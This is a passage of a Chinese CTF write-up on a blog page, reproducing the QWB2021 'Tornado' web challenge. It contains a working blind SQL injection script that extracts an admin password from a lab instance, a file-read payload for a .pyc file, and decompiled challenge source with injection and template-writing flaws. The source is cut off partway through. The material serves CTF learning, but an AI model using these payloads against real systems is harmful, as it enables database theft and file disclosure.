@@ -1,0 +1,516 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 5.3.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/Pooka.ico">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/Pooka.ico">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+  <link rel="stylesheet" href="//cdn.jsdelivr.net/gh/fancyapps/fancybox@3/dist/jquery.fancybox.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"npfs06.top","root":"/","scheme":"Mist","version":"7.8.0","exturl":false,"sidebar":{"position":"right","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":true,"show_result":true,"style":"mac"},"back2top":{"enable":true,"sidebar":true,"scrollpercent":true},"bookmark":{"enable":true,"color":"#222","save":"auto"},"fancybox":true,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.xml"};
+  </script>
+
+  <meta name="description" content="强网杯2021-托纳多复现">
+<meta property="og:type" content="website">
+<meta property="og:title" content="QWB2021 Quals 托纳多">
+<meta property="og:url" content="https://npfs06.top/posts/QWB2021-Quals-%E6%89%98%E7%BA%B3%E5%A4%9A.html">
+<meta property="og:site_name" content="安小琪&#39;s blog">
+<meta property="og:description" content="强网杯2021-托纳多复现">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="http://img.npfs06.top/20210723105353.png?imageView2/0/q/75|watermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10">
+<meta property="og:image" content="http://img.npfs06.top/20210723155111.png?imageView2/0/q/75|watermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10">
+<meta property="article:published_time" content="2021-07-23T05:50:49.000Z">
+<meta property="article:modified_time" content="2021-07-23T05:50:49.000Z">
+<meta property="article:author" content="安小琪">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://img.npfs06.top/20210723105353.png?imageView2/0/q/75|watermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10">
+
+<link rel="canonical" href="https://npfs06.top/posts/QWB2021-Quals-%E6%89%98%E7%BA%B3%E5%A4%9A">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : false,
+    lang   : 'en'
+  };
+</script>
+
+  <title>QWB2021 Quals 托纳多 | 安小琪's blog
+</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="Toggle navigation bar">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">安小琪's blog</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+      <p class="site-subtitle" itemprop="description">少年有梦，不应止于心动</p>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>Home</a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>Categories</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>Archives</a>
+
+  </li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>Search
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup">
+        <div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocapitalize="off"
+           placeholder="Searching..." spellcheck="false"
+           type="search" class="search-input">
+  </div>
+  <span class="popup-btn-close">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div id="search-result">
+  <div id="no-result">
+    <i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>
+  </div>
+</div>
+
+    </div>
+  </div>
+
+</div>
+    </header>
+
+    
+  <a role="button" class="book-mark-link book-mark-link-fixed"></a>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+  
+  
+
+          <div class="content page posts-expand">
+            
+
+    
+    
+    
+    <div class="post-block" lang="en">
+      <header class="post-header">
+
+<h1 class="post-title" itemprop="name headline">QWB2021 Quals 托纳多
+</h1>
+
+<div class="post-meta">
+  
+
+</div>
+
+</header>
+
+      
+      
+      
+      <div class="post-body">
+          <p>强网杯2021-托纳多复现<a id="more"></a></p>
+<h2 id="sql注入获取admin账号密码"><a href="#sql注入获取admin账号密码" class="headerlink" title="sql注入获取admin账号密码"></a>sql注入获取admin账号密码</h2><p><strong>利用<code>processlist</code>表读取正在执行的sql语句，从而得到表名与列名</strong></p>
+<img src="http://img.npfs06.top/20210723105353.png?imageView2/0/q/75|watermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10" style="zoom:70%;">
+
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url = <span class="string">&quot;http://9ea19d02-b943-4a06-9d06-ee9e316803a0.node4.buuoj.cn/&quot;</span></span><br><span class="line"><span class="keyword">for</span> n <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">150</span>):</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">31</span>,<span class="number">300</span>):</span><br><span class="line">        <span class="comment"># payload = &quot;if((ascii(substr((select (info)  FROM information_schema.processlist limit 0,1),&quot; + str( n + 1) + &quot;,1)) in (&quot; + str(i) + &quot;)),1,0)&quot;</span></span><br><span class="line">        <span class="comment">#SELECT qwbqwbqwbuser,qwbqwbqwbpass from qwbtttaaab111e where qwbqwbqwbuser=&#x27;andmin&#x27;</span></span><br><span class="line">        payload = <span class="string">&quot;if((ascii(substr((select qwbqwbqwbpass FROM qwbtttaaab111e limit 0,1),&quot;</span> + <span class="built_in">str</span>(n + <span class="number">1</span>) + <span class="string">&quot;,1)) in (&quot;</span> + <span class="built_in">str</span>(i) + <span class="string">&quot;)),1,0)&quot;</span></span><br><span class="line">        <span class="comment">#glzjin666888</span></span><br><span class="line">        r = requests.get(url + <span class="string">&quot;register.php?username=admin&#x27; and &quot;</span> + payload + <span class="string">&quot; and &#x27;1&amp;password=1&quot;</span>)</span><br><span class="line">        <span class="keyword">if</span> (<span class="string">&quot;username&quot;</span> <span class="keyword">in</span> r.text):</span><br><span class="line">            print(<span class="built_in">chr</span>(i), end=<span class="string">&quot;&quot;</span>)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">elif</span>(<span class="string">&quot;success&quot;</span> <span class="keyword">not</span> <span class="keyword">in</span> r.text):</span><br><span class="line">            print(<span class="string">&quot;n= &quot;</span>+<span class="built_in">str</span>(n)+<span class="string">&quot; i= &quot;</span>+<span class="built_in">str</span>(i)+<span class="string">&quot;|&quot;</span>+r.text)</span><br><span class="line">        </span><br><span class="line"><span class="comment">#glzjin666888</span></span><br></pre></td></tr></table></figure>
+<h2 id="os-path-join任意文件读取"><a href="#os-path-join任意文件读取" class="headerlink" title="os.path.join任意文件读取"></a>os.path.join任意文件读取</h2><p>得到密码后，登入即可，但是在buu发现，无法以admin身份登录，所以这一步只能跳过了</p>
+<p>预期解登入后，会看到一个图片，通过图片接口可有任意文件读取</p>
+<p>然后读/proc/self/cmdline</p>
+<p>可以得到python应用运行路径 python3 /qwb/app/app.py<br>读app.py和flag不允许，但是python有个pyc文件，</p>
+<p>pyc文件是有一定的命名规则的，既然我们得知了app.py的目录，我们就可以去该目录寻找pyc文件。pyc的命名规则为<code>__pycache__/文件名.cpython-2位版本号.pyc</code>，这里文件名为app，版本号需要爆破一下，其实如果你留心的话，本服务器在http返回头中返回了tornado版本号（tornado默认返回的）为<code>Server: TornadoServer/6.0.3</code>，而该版本的tornado只支持python3.5及其以上版本，因此这里只需要随便猜几次就猜到python版本号了。最终payload为：</p>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="regexp">/qwbimage.php?qwb_image_name=/</span>qwb<span class="regexp">/app/</span>__pycache__/app.cpython-<span class="number">35</span>.pyc</span><br></pre></td></tr></table></figure>
+<p>反编译后得到源码如下：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> tornado.ioloop, tornado.web, tornado.options, pymysql, os, re</span><br><span class="line">settings = &#123;<span class="string">&#x27;static_path&#x27;</span>: os.path.join(os.getcwd(), <span class="string">&#x27;static&#x27;</span>),</span><br><span class="line"> <span class="string">&#x27;cookie_secret&#x27;</span>: <span class="string">&#x27;b93a9960-bfc0-11eb-b600-002b677144e0&#x27;</span>&#125;</span><br><span class="line">db_username = <span class="string">&#x27;root&#x27;</span></span><br><span class="line">db_password = <span class="string">&#x27;xxxx&#x27;</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MainHandler</span>(<span class="params">tornado.web.RequestHandler</span>):</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">get</span>(<span class="params">self</span>):</span></span><br><span class="line">        user = self.get_secure_cookie(<span class="string">&#x27;user&#x27;</span>)</span><br><span class="line">        <span class="keyword">if</span> user <span class="keyword">and</span> user == <span class="string">b&#x27;admin&#x27;</span>:</span><br><span class="line">            self.redirect(<span class="string">&#x27;/admin.php&#x27;</span>, permanent=<span class="literal">True</span>)</span><br><span class="line">            <span class="keyword">return</span></span><br><span class="line">        self.render(<span class="string">&#x27;index.html&#x27;</span>)</span><br><span class="line">        </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">LoginHandler</span>(<span class="params">tornado.web.RequestHandler</span>):</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">get</span>(<span class="params">self</span>):</span></span><br><span class="line">        username = self.get_argument(<span class="string">&#x27;username&#x27;</span>, <span class="string">&#x27;&#x27;</span>)</span><br><span class="line">        password = self.get_argument(<span class="string">&#x27;password&#x27;</span>, <span class="string">&#x27;&#x27;</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> username <span class="keyword">or</span> <span class="keyword">not</span> password:</span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> self.get_secure_cookie(<span class="string">&#x27;user&#x27;</span>):</span><br><span class="line">                self.finish(<span class="string">&#x27;&lt;script&gt;alert(`please input your password and username`);history.go(-1);&lt;/script&gt;&#x27;</span>)</span><br><span class="line">                <span class="keyword">return</span></span><br><span class="line">            <span class="keyword">if</span> self.get_secure_cookie(<span class="string">&#x27;user&#x27;</span>) == <span class="string">b&#x27;admin&#x27;</span>:</span><br><span class="line">                self.redirect(<span class="string">&#x27;/admin.php&#x27;</span>, permanent=<span class="literal">True</span>)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                self.redirect(<span class="string">&#x27;/&#x27;</span>, permanent=<span class="literal">True</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            conn = pymysql.connect(<span class="string">&#x27;localhost&#x27;</span>, db_username, db_password, <span class="string">&#x27;qwb&#x27;</span>)</span><br><span class="line">            cursor = conn.cursor()</span><br><span class="line">            cursor.execute(<span class="string">&#x27;SELECT * from qwbtttaaab111e where qwbqwbqwbuser=%s and qwbqwbqwbpass=%s&#x27;</span>, [username, password])</span><br><span class="line">            results = cursor.fetchall()</span><br><span class="line">            <span class="keyword">if</span> <span class="built_in">len</span>(results) != <span class="number">0</span>:</span><br><span class="line">                <span class="keyword">if</span> results[<span class="number">0</span>][<span class="number">1</span>] == <span class="string">&#x27;admin&#x27;</span>:</span><br><span class="line">                    self.set_secure_cookie(<span class="string">&#x27;user&#x27;</span>, <span class="string">&#x27;admin&#x27;</span>)</span><br><span class="line">                    cursor.close()</span><br><span class="line">                    conn.commit()</span><br><span class="line">                    conn.close()</span><br><span class="line">                    self.redirect(<span class="string">&#x27;/admin.php&#x27;</span>, permanent=<span class="literal">True</span>)</span><br><span class="line">                    <span class="keyword">return</span></span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    cursor.close()</span><br><span class="line">                    conn.commit()</span><br><span class="line">                    conn.close()</span><br><span class="line">                    self.finish(<span class="string">&#x27;&lt;script&gt;alert(`login success, but only admin can get flag`);history.go(-1);&lt;/script&gt;&#x27;</span>)</span><br><span class="line">                    <span class="keyword">return</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                cursor.close()</span><br><span class="line">                conn.commit()</span><br><span class="line">                conn.close()</span><br><span class="line">                self.finish(<span class="string">&#x27;&lt;script&gt;alert(`your username or password is error`);history.go(-1);&lt;/script&gt;&#x27;</span>)</span><br><span class="line">                <span class="keyword">return</span></span><br><span class="line">            </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">RegisterHandler</span>(<span class="params">tornado.web.RequestHandler</span>):</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">get</span>(<span class="params">self</span>):</span></span><br><span class="line">        username = self.get_argument(<span class="string">&#x27;username&#x27;</span>, <span class="string">&#x27;&#x27;</span>)</span><br><span class="line">        password = self.get_argument(<span class="string">&#x27;password&#x27;</span>, <span class="string">&#x27;&#x27;</span>)</span><br><span class="line">        word_bans = [<span class="string">&#x27;table&#x27;</span>, <span class="string">&#x27;col&#x27;</span>, <span class="string">&#x27;sys&#x27;</span>, <span class="string">&#x27;union&#x27;</span>, <span class="string">&#x27;inno&#x27;</span>, <span class="string">&#x27;like&#x27;</span>, <span class="string">&#x27;regexp&#x27;</span>]</span><br><span class="line">        bans = [<span class="string">&#x27;&quot;&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;%&#x27;</span>, <span class="string">&#x27;&amp;&#x27;</span>, <span class="string">&#x27;;&#x27;</span>, <span class="string">&#x27;&lt;&#x27;</span>, <span class="string">&#x27;=&#x27;</span>, <span class="string">&#x27;&gt;&#x27;</span>, <span class="string">&#x27;\\&#x27;</span>, <span class="string">&#x27;^&#x27;</span>, <span class="string">&#x27;`&#x27;</span>, <span class="string">&#x27;|&#x27;</span>, <span class="string">&#x27;*&#x27;</span>, <span class="string">&#x27;--&#x27;</span>, <span class="string">&#x27;+&#x27;</span>]</span><br><span class="line">        <span class="keyword">for</span> ban <span class="keyword">in</span> word_bans:</span><br><span class="line">            <span class="keyword">if</span> re.search(ban, username, re.IGNORECASE):</span><br><span class="line">                self.finish(<span class="string">&#x27;&lt;script&gt;alert(`error`);history.go(-1);&lt;/script&gt;&#x27;</span>)</span><br><span class="line">                <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> ban <span class="keyword">in</span> bans:</span><br><span class="line">            <span class="keyword">if</span> ban <span class="keyword">in</span> username:</span><br><span class="line">                self.finish(<span class="string">&#x27;&lt;script&gt;alert(`error`);history.go(-1);&lt;/script&gt;&#x27;</span>)</span><br><span class="line">                <span class="keyword">return</span></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> username <span class="keyword">or</span> <span class="keyword">not</span> password:</span><br><span class="line">            self.render(<span class="string">&#x27;register.html&#x27;</span>)</span><br><span class="line">            <span class="keyword">return</span></span><br><span class="line">        <span class="keyword">if</span> username == <span class="string">&#x27;admin&#x27;</span>:</span><br><span class="line">            self.render(<span class="string">&#x27;register.html&#x27;</span>)</span><br><span class="line">            <span class="keyword">return</span></span><br><span class="line">        conn = pymysql.connect(<span class="string">&#x27;localhost&#x27;</span>, db_username, db_password, <span class="string">&#x27;qwb&#x27;</span>)</span><br><span class="line">        cursor = conn.cursor()</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            cursor.execute(<span class="string">&quot;SELECT qwbqwbqwbuser,qwbqwbqwbpass from qwbtttaaab111e where qwbqwbqwbuser=&#x27;%s&#x27;&quot;</span> % username)</span><br><span class="line">            results = cursor.fetchall()</span><br><span class="line">            <span class="keyword">if</span> <span class="built_in">len</span>(results) != <span class="number">0</span>:</span><br><span class="line">                self.finish(<span class="string">&#x27;&lt;script&gt;alert(`this username had been used`);history.go(-1);&lt;/script&gt;&#x27;</span>)</span><br><span class="line">                conn.commit()</span><br><span class="line">                conn.close()</span><br><span class="line">                <span class="keyword">return</span></span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            conn.commit()</span><br><span class="line">            conn.close()</span><br><span class="line">            self.finish(<span class="string">&#x27;&lt;script&gt;alert(`error`);history.go(-1);&lt;/script&gt;&#x27;</span>)</span><br><span class="line">            <span class="keyword">return</span></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            cursor.execute(<span class="string">&#x27;insert into qwbtttaaab111e (qwbqwbqwbuser, qwbqwbqwbpass) values(%s, %s)&#x27;</span>, [username, password])</span><br><span class="line">            conn.commit()</span><br><span class="line">            conn.close()</span><br><span class="line">            self.finish(<span class="string">&quot;&lt;script&gt;alert(`success`);location.href=&#x27;/index.php&#x27;;&lt;/script&gt;&quot;</span>)</span><br><span class="line">            <span class="keyword">return</span></span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            conn.rollback()</span><br><span class="line">            conn.close()</span><br><span class="line">            self.finish(<span class="string">&#x27;&lt;script&gt;alert(`error`);history.go(-1);&lt;/script&gt;&#x27;</span>)</span><br><span class="line">            <span class="keyword">return</span></span><br><span class="line">            </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">LogoutHandler</span>(<span class="params">tornado.web.RequestHandler</span>):</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">get</span>(<span class="params">self</span>):</span></span><br><span class="line">        self.clear_all_cookies()</span><br><span class="line">        self.redirect(<span class="string">&#x27;/&#x27;</span>, permanent=<span class="literal">True</span>)</span><br><span class="line">        </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">AdminHandler</span>(<span class="params">tornado.web.RequestHandler</span>):</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">get</span>(<span class="params">self</span>):</span></span><br><span class="line">        user = self.get_secure_cookie(<span class="string">&#x27;user&#x27;</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> user <span class="keyword">or</span> user != <span class="string">b&#x27;admin&#x27;</span>:</span><br><span class="line">            self.redirect(<span class="string">&#x27;/index.php&#x27;</span>, permanent=<span class="literal">True</span>)</span><br><span class="line">            <span class="keyword">return</span></span><br><span class="line">        self.render(<span class="string">&#x27;admin.html&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ImageHandler</span>(<span class="params">tornado.web.RequestHandler</span>):</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">get</span>(<span class="params">self</span>):</span></span><br><span class="line">        user = self.get_secure_cookie(<span class="string">&#x27;user&#x27;</span>)</span><br><span class="line">        image_name = self.get_argument(<span class="string">&#x27;qwb_image_name&#x27;</span>, <span class="string">&#x27;header.jpeg&#x27;</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> image_name:</span><br><span class="line">            self.redirect(<span class="string">&#x27;/&#x27;</span>, permanent=<span class="literal">True</span>)</span><br><span class="line">            <span class="keyword">return</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> user <span class="keyword">or</span> user != <span class="string">b&#x27;admin&#x27;</span>:</span><br><span class="line">                self.redirect(<span class="string">&#x27;/&#x27;</span>, permanent=<span class="literal">True</span>)</span><br><span class="line">                <span class="keyword">return</span></span><br><span class="line">            <span class="keyword">if</span> image_name.endswith(<span class="string">&#x27;.py&#x27;</span>) <span class="keyword">or</span> <span class="string">&#x27;flag&#x27;</span> <span class="keyword">in</span> image_name <span class="keyword">or</span> <span class="string">&#x27;..&#x27;</span> <span class="keyword">in</span> image_name:</span><br><span class="line">                self.finish(<span class="string">&quot;nonono, you can&#x27;t read it.&quot;</span>)</span><br><span class="line">                <span class="keyword">return</span></span><br><span class="line">            image_name = os.path.join(os.getcwd() + <span class="string">&#x27;/image&#x27;</span>, image_name)</span><br><span class="line">            <span class="keyword">with</span> <span class="built_in">open</span>(image_name, <span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> (f):</span><br><span class="line">                img = f.read()</span><br><span class="line">            self.set_header(<span class="string">&#x27;Content-Type&#x27;</span>, <span class="string">&#x27;image/jpeg&#x27;</span>)</span><br><span class="line">            self.finish(img)</span><br><span class="line">            <span class="keyword">return</span></span><br><span class="line">        </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">SecretHandler</span>(<span class="params">tornado.web.RequestHandler</span>):</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">get</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(tornado.web.RequestHandler._template_loaders):</span><br><span class="line">            <span class="keyword">for</span> i <span class="keyword">in</span> tornado.web.RequestHandler._template_loaders:</span><br><span class="line">                tornado.web.RequestHandler._template_loaders[i].reset()</span><br><span class="line"></span><br><span class="line">        msg = self.get_argument(<span class="string">&#x27;congratulations&#x27;</span>, <span class="string">&#x27;oh! you find it&#x27;</span>)</span><br><span class="line">        bans = []</span><br><span class="line">        <span class="keyword">for</span> ban <span class="keyword">in</span> bans:</span><br><span class="line">            <span class="keyword">if</span> ban <span class="keyword">in</span> msg:</span><br><span class="line">                self.finish(<span class="string">&#x27;bad hack,go out!&#x27;</span>)</span><br><span class="line">                <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;congratulations.html&#x27;</span>, <span class="string">&#x27;w&#x27;</span>) <span class="keyword">as</span> (f):</span><br><span class="line">            f.write(<span class="string">&#x27;&lt;html&gt;&lt;head&gt;&lt;title&gt;congratulations&lt;/title&gt;&lt;/head&gt;&lt;body&gt;&lt;script type=&quot;text/javascript&quot;&gt;alert(&quot;%s&quot;);location.href=\&#x27;/admin.php\&#x27;;&lt;/script&gt;&lt;/body&gt;&lt;/html&gt;\n&#x27;</span> % msg)</span><br><span class="line">            f.flush()</span><br><span class="line">        self.render(<span class="string">&#x27;congratulations.html&#x27;</span>)</span><br><span class="line">        <span class="keyword">if</span> tornado.web.RequestHandler._template_loaders:</span><br><span class="line">            <span class="keyword">for</span> i <span class="keyword">in</span> tornado.web.RequestHandler._template_loaders:</span><br><span class="line">                tornado.web.RequestHandler._template_loaders[i].reset()</span><br><span class="line">                </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">make_app</span>():</span></span><br><span class="line">    <span class="keyword">return</span> tornado.web.Application([</span><br><span class="line">     (</span><br><span class="line">      